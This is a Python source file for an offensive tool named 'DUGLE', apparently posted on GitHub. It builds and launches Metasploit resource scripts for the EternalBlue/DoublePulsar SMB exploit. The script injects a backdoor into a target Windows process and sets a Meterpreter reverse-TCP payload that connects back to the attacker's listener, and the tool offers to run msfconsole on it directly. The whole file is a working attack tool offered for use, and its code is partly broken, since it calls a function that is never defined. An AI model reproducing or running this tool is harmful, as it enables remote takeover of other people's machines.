# -*- coding: utf-8 -*-
from colorama import *
import os
import sys
import subprocess as sub

logo = Fore.BLUE+"""
██████╗ ██╗   ██╗ ██████╗ ██╗     ███████╗
██╔══██╗██║   ██║██╔════╝ ██║     ██╔════╝
██║  ██║██║   ██║██║  ███╗██║     █████╗  
██║  ██║██║   ██║██║   ██║██║     ██╔══╝  
██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗
╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
""" + Fore.RESET + """___________________________________________

        CREATED BY SAMUEL / MOBIE
      HTTPS://GITHUB.COM/MOBIE/DUGLE
""" + Fore.RESET + """___________________________________________
	 	"""

def main():
	print(logo)
	print(Fore.YELLOW+""" 	 
1)""" + Fore.RESET +""" Generate Eternalblue_doublepulsar Exploit"""+ Fore.YELLOW +"""
2)""" + Fore.RESET +""" Vulnerability Analysys"""+ Fore.YELLOW +"""
3)""" + Fore.RESET +""" Attack! (NOT READY) """ + Fore.YELLOW +""" 

0) """ + Fore.RESET + """Exit	
	""")  


	currentPayload = "none"
	mchoice = raw_input("> ")
	
	if mchoice == "1":
		generate()
	elif mchoice == "2":
		analysys()
	elif mchoice == "3":
		attack()
	elif mchoice == "0":
		sys.exit()
	else:
		print("\nYou didn't enter a correct choice.")


def generate():
	print("Process the backdoor will be injected in: (Recommended: explorer.exe)")
	processinject=raw_input("")
	print("\nTargets System Architecture: (x64 or x86)")
	architecture=raw_input("")
	print("\nTarget IP Address: ")
	rhost=raw_input("")
	print("\nPayload: (Recommended: 'windows/meterpreter/reverse_tcp')")
	payload=raw_input("")
	print("\nEnter listening IP Address: ")
	lhost=raw_input("")
	print("\nEnter listening port: ")
	lport=raw_input("")
	
	print('\nWhat would you like to call this exploit?')
	name=raw_input("")
	
	print("\n\nWould you like to run this exploit now?\nY/N")
	run=raw_input("")
	
	if run == "y":
		p = os.popen('msfconsole -r '+name,"r")
		while 1:
			line = p.readline()
			if not line: break
			print line		
	else:
		print("\n\nWould you like to run this exploit now or save it for later?\nY/N")
		run=raw_input("")
	
	
	if processinject == "":
		processinject = "explorer.exe"
	if architecture == "":
		architecture = "x86"
	if architecture == "x64" and payload == "":
		payload = "windows/x64/meterpreter/reverse_tcp"
	elif architecture == "x86" and payload == "":
		payload = "windows/meterpreter/reverse_tcp"

		

	
	file=open(name+".rc", "w+")
	
	file.write("use exploit/windows/smb/eternalblue_doublepulsar\n")
	file.write('set PROCESSINJECT ' + processinject + "\n")
	file.write('set TARGETARCHITECTURE '  + architecture + "\n")
	file.write('set RHOST ' + rhost + "\n")
	file.write('set PAYLOAD ' + payload + "\n")
	file.write('set LHOST ' + lhost + "\n")
	file.write('set LPORT ' + lport + "\n")
	file.write('exploit' + "\n")
	
	file.close()
	main()
	
def attack():
	print('\nPlease enter the path of your exploit file: (Example: /root/payloads/exploit.rc)')
	path=raw_input("\n")
	if os.path.isfile(path):
		p = os.popen('msfconsole -r '+path,"r")
		while 1:
			line = p.readline()
			if not line: break
			print line
	else:
		print("\nInvalid file name.")
		main()










if( __name__ == "__main__" ):
	main()
